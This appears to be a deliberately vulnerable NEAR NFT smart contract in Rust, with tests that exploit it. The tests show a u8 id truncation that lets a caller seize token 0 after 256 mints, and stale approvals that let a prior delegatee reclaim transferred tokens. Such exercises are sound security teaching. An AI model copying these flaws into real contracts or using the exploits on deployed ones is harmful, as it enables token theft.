use near_sdk::store::LookupMap;
use near_sdk::{env, near, require, AccountId};

pub type Id = u8;

#[near(contract_state)]
pub struct Contract {
    pub tokens: LookupMap<Id, AccountId>,
    pub approvals: LookupMap<Id, AccountId>,
    pub supply: u16,
}

impl Default for Contract {
    fn default() -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, "admin.near".parse().unwrap());
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }
}

#[near]
impl Contract {
    #[init]
    #[private] // only callable by the contract's account
    pub fn init(admin: AccountId) -> Self {
        Self {
            tokens: {
                let mut a = LookupMap::new(b"tokens".to_vec());
                a.insert(0, admin);
                a
            },
            approvals: LookupMap::new(b"approvals".to_vec()),
            supply: 1,
        }
    }

    pub fn owner_of(&self, id: Id) -> Option<AccountId> {
        self.tokens.get(&id).cloned()
    }

    pub fn mint(&mut self) -> Id {
        self.tokens
            .insert(self.supply.to_le_bytes()[0], env::predecessor_account_id());
        let id = self.supply;
        self.supply += 1;
        id as Id
    }

    pub fn approve(&mut self, id: Id, delegatee: AccountId) {
        require!(
            self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id(),
            "not owner!"
        );
        self.approvals.insert(id, delegatee);
    }

    pub fn transfer(&mut self, id: Id, receiver: AccountId) {
        require!(
            self.tokens.get(&id).unwrap().clone() == env::predecessor_account_id()
                || self.approvals.get(&id).unwrap().clone() == env::predecessor_account_id(),
            "not owner!"
        );
        self.tokens.insert(id, receiver);
    }
}

use near_sdk::log;

#[cfg(test)]
mod tests {
    use super::*;
    use near_sdk::{test_utils::VMContextBuilder, testing_env};

    #[test]
    fn exploit_mint_overflow() {
        let bob: AccountId = "bob.near".parse().unwrap();
        set_context(bob.clone());
        // init
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());
        assert_eq!(contract.owner_of(0).unwrap(), admin);

        // create a mint loop until the supply is 256
        for i in 0..256 {
            contract.mint();
        }
        println!("Mint loop completed!");
        assert_eq!(contract.supply, 257);
        assert_eq!(contract.owner_of(0).unwrap(), bob);
    }

    #[test]
    fn exploit_approval_transfer() {
        let bob: AccountId = "bob.near".parse().unwrap();
        set_context(bob.clone());
        // init
        let admin: AccountId = "admin.near".parse().unwrap();
        let mut contract = Contract::init(admin.clone());
        assert_eq!(contract.owner_of(0).unwrap(), admin);

        // mint a new NFT
        let id = contract.mint();
        // check the owner of the NFT
        assert_eq!(contract.owner_of(id).unwrap(), bob);

        // approve the bob
        contract.approve(id, bob.clone());
        // transfer the NFT to the admin
        contract.transfer(id, admin.clone());
        // check the owner of the NFT
        assert_eq!(contract.owner_of(id).unwrap(), admin);
        // check the approval of the NFT
        assert_eq!(contract.approvals.get(&id).unwrap().clone(), bob);
        // transfer the NFT back to bob
        contract.transfer(id, bob.clone());
        // check the owner of the NFT
        assert_eq!(contract.owner_of(id).unwrap(), bob);
    }

    // Auxiliar fn: create a mock context
    fn set_context(predecessor: AccountId) {
        let mut builder = VMContextBuilder::new();
        builder.predecessor_account_id(predecessor);

        testing_env!(builder.build());
    }
}
